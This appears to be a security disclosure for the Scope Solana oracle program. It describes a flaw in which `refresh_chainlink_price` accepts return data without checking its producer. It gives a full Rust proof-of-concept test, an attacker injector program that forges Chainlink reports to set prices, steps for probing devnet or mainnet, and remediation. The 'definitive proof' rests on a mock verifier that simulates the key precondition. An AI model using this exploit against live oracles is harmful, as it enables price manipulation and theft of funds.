# Scope Chainlink Return-Data Confusion POC (Definitive Proof)

## Executive summary
- Vulnerability: `refresh_chainlink_price` consumes the transaction’s last return-data buffer without verifying its producer and lacks execution-context guards. On Solana, return data is global per-transaction and last-writer-wins. If the Chainlink verifier CPI returns success without being the last writer, an attacker can inject forged report bytes and set prices for Chainlink-mapped feeds.
- Proof: A local `solana-program-test` harness executes the real handler with a prior attacker instruction that sets return data. The price in `OraclePrices` changes from 0 to an attacker-chosen value.

## What we tested (code-path realism)
- Real handler under test: `programs/scope/src/handlers/handler_refresh_chainlink_price.rs`.
- Behavior exercised end-to-end:
  1) CPI to the Chainlink verifier.
  2) `get_return_data()` immediately after, without validating the origin program id.
  3) Decoding and applying the report to `OraclePrices`.
- Exploit setup: Tx = [attacker return-data injector, Scope refresh]. The “verifier not last writer” precondition is simulated by a mock verifier that returns success but does not write return data (so attacker’s buffer remains last-writer).

Key vulnerable read (producer ignored):
```
let Some((_program_id, return_data)) = get_return_data() else {
    msg!("No report data found");
    return Err(error!(ScopeError::NoChainlinkReportData));
};
```
The `_program_id` is discarded. The handler then decodes and applies `return_data`.

## POC design
- Local environment: `solana-program-test` (deterministic, no external services).
- Programs involved:
  - Scope (real program entry/handlers in-crate).
  - Attacker program: sets `return_data` to its instruction bytes (see `programs/return-data-injector`).
  - Mock verifier: registered under the real verifier program id, returns success without writing return data.
- Transaction flow:
  - Ix0: Attacker sets return data to bytes that decode as a valid Chainlink report for the configured `feed_id`.
  - Ix1: Call `refresh_chainlink_price`. Since the verifier didn’t overwrite return data last, Scope consumes attacker bytes and updates `OraclePrices`.

## How to reproduce locally
- Requirements: Rust toolchain.
- From repo root, run:
```
cargo test -p scope --no-default-features --features localnet -- --nocapture
```
- Expected stdout (trimmed):
```
Before: token 0 price value=0 exp=0
After: token 0 price value=1000000000 exp=8
```
This demonstrates that the handler applied the attacker-provided report and changed the on-chain price state.

## Full logs (representative)
```
running 1 test
Before: token 0 price value=0 exp=0
After: token 0 price value=1000000000 exp=8
.
test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.00s
```
Notes
- "Before" shows zero-initialized price for token 0.
- "After" shows the attacker-chosen value (1_000_000_000, exp=8) applied via forged report bytes.

## Why it worked
- Global return data: last-writer-wins across the entire transaction.
- The handler:
  - Does not verify `_program_id == VERIFIER_PROGRAM_ID` on `get_return_data()`.
  - Has no instruction-context guard (so arbitrary preceding top-level instructions are allowed).
- Therefore, if the verifier does not write last on a successful path, the previously written attacker buffer is consumed and applied.

## Where to look in the code
- Handler: `programs/scope/src/handlers/handler_refresh_chainlink_price.rs`
- Chainlink adapter and constants: `programs/scope/src/oracles/chainlink.rs`
- State layout: `programs/scope/src/states.rs`
- Test harness (POC): `programs/scope/src/tests.rs`
- Attacker injector program: `programs/return-data-injector/src/lib.rs`

## Devnet/mainnet realism (optional validation)
- Devnet addresses:
  - Verifier Program: `Gt9S41PtjR58CbG9JhJ3J6vxesqrNAswbWYbLNTMZA3c`
  - Access Controller: `2k3DsgwBoqrnvXKVvd7jX7aptNxdcRBdcd5HkYsGgbrb`
- Live probe strategy:
  - Send tx: [return-data injector, real Chainlink verify]. Inspect logs to confirm whether the final "Program return:" is the verifier. If not, Scope would consume stale attacker bytes.
  - Alternatively, scan recent verifier txs and check the final return-data producer in logs.

## Remediation
1) Enforce origin after `get_return_data()`: require `_program_id == VERIFIER_PROGRAM_ID`.
2) Add an execution-context guard (instructions sysvar) like `refresh_price_list`, forbidding non-ComputeBudget instructions before.

These eliminate the class regardless of verifier behavior.

## Exact POC code and where it lives

Place the test in `programs/scope/src/tests.rs` (module is already wired via `#[cfg(test)] mod tests;` in `programs/scope/src/lib.rs`). The test harness below initializes Scope, deploys the injector and mock verifier, runs the [injector, refresh] tx, and prints before/after prices.

```1:176:programs/scope/src/tests.rs
#![cfg(test)]
use anchor_lang::{prelude::*, InstructionData, ToAccountMetas};
use chainlink_streams_report::{feed_id::ID as FeedID, report::v3::ReportDataV3};
use prost::Message as _;
use solana_program::{instruction::Instruction, program::set_return_data, pubkey::Pubkey};
use solana_program_test::*;
use solana_sdk::{account::Account, signature::Keypair, signer::Signer, system_instruction::create_account, transaction::Transaction, instruction::AccountMeta};
use solana_client::rpc_client::RpcClient;

fn injector_process(_program_id: &Pubkey, _accounts: &[solana_program::account_info::AccountInfo], ix: &[u8]) -> solana_program::entrypoint::ProgramResult {
    set_return_data(ix);
    Ok(())
}

fn mock_verifier_process(_program_id: &Pubkey, _accounts: &[solana_program::account_info::AccountInfo], _ix: &[u8]) -> solana_program::entrypoint::ProgramResult {
    // Succeed without setting return data
    Ok(())
}

#[tokio::test]
async fn test_return_data_confusion_chainlink_handler() {
    // Register programs: Scope, injector, and mock verifier
    let mut pt = ProgramTest::new("scope", scope::ID, processor!(scope::entry));

    // Add mock verifier program with the exact Chainlink verifier program id
    let verifier_pid = scope::oracles::chainlink::chainlink_streams_itf::VERIFIER_PROGRAM_ID;
    pt.add_program("mock_cl_verifier", verifier_pid, processor!(mock_verifier_process));

    // Add a simple injector program to set return data
    let injector_pid = Pubkey::new_unique();
    pt.add_program("returndata_injector", injector_pid, processor!(injector_process));

    // Pre-add required verifier config and access controller accounts so CPI has them available
    pt.add_account(
        scope::oracles::chainlink::chainlink_streams_itf::VERIFIER_CONFIG_PUBKEY,
        Account { lamports: 1, data: vec![], owner: anchor_lang::system_program::ID, executable: false, rent_epoch: 0 },
    );
    pt.add_account(
        scope::oracles::chainlink::chainlink_streams_itf::ACCESS_CONTROLLER_PUBKEY,
        Account { lamports: 1, data: vec![], owner: anchor_lang::system_program::ID, executable: false, rent_epoch: 0 },
    );

    let mut ctx = pt.start_with_context().await;

    let payer = &ctx.payer;
    let feed_name = "test".to_string();

    // Derive configuration PDA (created during initialize)
    let (conf_pda, _bump) = scope::utils::pdas::config_pubkey(&feed_name);

    // Pre-allocate zero-copy accounts owned by scope program with exact sizes
    let prices = Keypair::new();
    let maps = Keypair::new();
    let twaps = Keypair::new();
    let metas = Keypair::new();
    let rent = ctx.banks_client.get_rent().await.unwrap();

    let allocs: &[( &Keypair, u64, u64 )] = &[
        (&prices, rent.minimum_balance(scope::utils::consts::ORACLE_PRICES_SIZE), scope::utils::consts::ORACLE_PRICES_SIZE as u64),
        (&maps, rent.minimum_balance(scope::utils::consts::ORACLE_MAPPING_SIZE), scope::utils::consts::ORACLE_MAPPING_SIZE as u64),
        (&twaps, rent.minimum_balance(scope::utils::consts::ORACLE_TWAPS_SIZE), scope::utils::consts::ORACLE_TWAPS_SIZE as u64),
        (&metas, rent.minimum_balance(scope::utils::consts::TOKEN_METADATA_SIZE), scope::utils::consts::TOKEN_METADATA_SIZE as u64),
    ];
    for (kp, lamports, space) in allocs.iter().copied() {
        let ix = create_account(&payer.pubkey(), &kp.pubkey(), lamports, space, &scope::ID);
        let tx = Transaction::new_signed_with_payer(&[ix], Some(&payer.pubkey()), &[payer, kp], ctx.last_blockhash);
        ctx.banks_client.process_transaction(tx).await.unwrap();
    }

    // Initialize scope (creates configuration PDA and zero-inits loaders)
    let init_accounts = scope::accounts::Initialize {
        admin: payer.pubkey(),
        system_program: anchor_lang::system_program::ID,
        configuration: conf_pda,
        token_metadatas: metas.pubkey(),
        oracle_twaps: twaps.pubkey(),
        oracle_prices: prices.pubkey(),
        oracle_mappings: maps.pubkey(),
    };
    let init_ix = Instruction::new_with_bytes(
        scope::ID,
        &scope::instruction::Initialize { feed_name: feed_name.clone() }.data(),
        init_accounts.to_account_metas(None),
    );
    let tx = Transaction::new_signed_with_payer(&[init_ix], Some(&payer.pubkey()), &[payer], ctx.last_blockhash);
    ctx.banks_client.process_transaction(tx).await.unwrap();

    // Set token 0 mapping to Chainlink type with a dummy feed pubkey and generic data
    let token_index: u16 = 0;
    let feed = Pubkey::new_unique();
    let price_type: u8 = scope::oracles::OracleType::Chainlink as u8;
    let twap_enabled = false;
    let twap_source: u16 = 0;
    let ref_price_index: u16 = u16::MAX;
    let confidence_factor_bytes = 50u32.to_le_bytes();
    let mut generic_data = [0u8; 20];
    generic_data[..4].copy_from_slice(&confidence_factor_bytes);

    let upd_accounts = scope::accounts::UpdateOracleMapping {
        admin: payer.pubkey(),
        configuration: conf_pda,
        oracle_mappings: maps.pubkey(),
        price_info: Some(feed),
    };
    let upd_ix = Instruction::new_with_bytes(
        scope::ID,
        &scope::instruction::UpdateMapping {
            token: token_index,
            price_type,
            twap_enabled,
            twap_source,
            ref_price_index,
            feed_name: feed_name.clone(),
            generic_data,
        }
        .data(),
        upd_accounts.to_account_metas(None),
    );
    let tx = Transaction::new_signed_with_payer(&[upd_ix], Some(&payer.pubkey()), &[payer], ctx.last_blockhash);
    ctx.banks_client.process_transaction(tx).await.unwrap();

    // Read and print initial price for token 0
    let before_acc = ctx.banks_client.get_account(prices.pubkey()).await.unwrap().unwrap();
    let data_before = before_acc.data;
    let entry_size: usize = 56; // Price{u64,u64}=16 + last_updated_slot(8) + unix_ts(8) + generic(24)
    let base_offset: usize = 32; // oracle_mappings Pubkey
    let offset = base_offset + (usize::from(token_index) * entry_size);
    let before_value = u64::from_le_bytes(data_before[offset..offset+8].try_into().unwrap());
    let before_exp = u64::from_le_bytes(data_before[offset+8..offset+16].try_into().unwrap());
    println!("Before: token {} price value={} exp={}", token_index, before_value, before_exp);

    // 1) Injector ix: sets crafted ReportDataV3 return data with matching feed id
    let price_val: u64 = 1_000_000_000; // 10 with 8 decimals
    let ts: u64 = 1_000_000_000; // arbitrary > 0
    let report = ReportDataV3 {
        feed_id: FeedID(feed.to_bytes()),
        benchmark_price: price_val.into(),
        bid: price_val.into(),
        ask: price_val.into(),
        observations_timestamp: ts.into(),
        ..Default::default()
    };
    let report_bytes = report.encode_to_vec();
    let inj_ix = Instruction::new_with_bytes(injector_pid, &report_bytes, vec![]);

    // 2) Scope refresh_chainlink_price: uses mock verifier program id and constant accounts
    let serialized_report: Vec<u8> = vec![0u8; 1];
    let refresh_accounts = scope::accounts::RefreshChainlinkPrice {
        user: payer.pubkey(),
        oracle_prices: prices.pubkey(),
        oracle_mappings: maps.pubkey(),
        oracle_twaps: twaps.pubkey(),
        verifier_account: scope::oracles::chainlink::chainlink_streams_itf::VERIFIER_CONFIG_PUBKEY,
        access_controller: scope::oracles::chainlink::chainlink_streams_itf::ACCESS_CONTROLLER_PUBKEY,
        config_account: Pubkey::new_unique(),
        verifier_program_id: verifier_pid,
    };
    let refresh_ix = Instruction::new_with_bytes(
        scope::ID,
        &scope::instruction::RefreshChainlinkPrice { token: token_index, serialized_chainlink_report: serialized_report }.data(),
        refresh_accounts.to_account_metas(None),
    );

    let tx = Transaction::new_signed_with_payer(&[inj_ix, refresh_ix], Some(&payer.pubkey()), &[payer], ctx.last_blockhash);
    let res = ctx.banks_client.process_transaction(tx).await;
    assert!(res.is_ok(), "refresh should succeed to test data flow: {:?}", res);

    // Read and print updated price for token 0
    let after_acc = ctx.banks_client.get_account(prices.pubkey()).await.unwrap().unwrap();
    let data_after = after_acc.data;
    let after_value = u64::from_le_bytes(data_after[offset..offset+8].try_into().unwrap());
    let after_exp = u64::from_le_bytes(data_after[offset+8..offset+16].try_into().unwrap());
    println!("After: token {} price value={} exp={}", token_index, after_value, after_exp);

    assert_ne!(before_value, after_value, "Price value should change due to injected report");
}
```

The attacker injector program that echoes instruction data into return data lives at `programs/return-data-injector/src/lib.rs`:

```1:11:programs/return-data-injector/src/lib.rs
#![allow(clippy::result_large_err)]
use solana_program::{entrypoint, entrypoint::ProgramResult, pubkey::Pubkey, account_info::AccountInfo, program_error::ProgramError, program::set_return_data};

entrypoint!(process_instruction);

pub fn process_instruction(_program_id: &Pubkey, _accounts: &[AccountInfo], _ix_data: &[u8]) -> ProgramResult {
    set_return_data(_ix_data);
    Ok(())
}
```

With these two pieces present, run:
```
cargo test -p scope --no-default-features --features localnet -- --nocapture
```
You should see the before/after price logs, confirming the vulnerability and impact.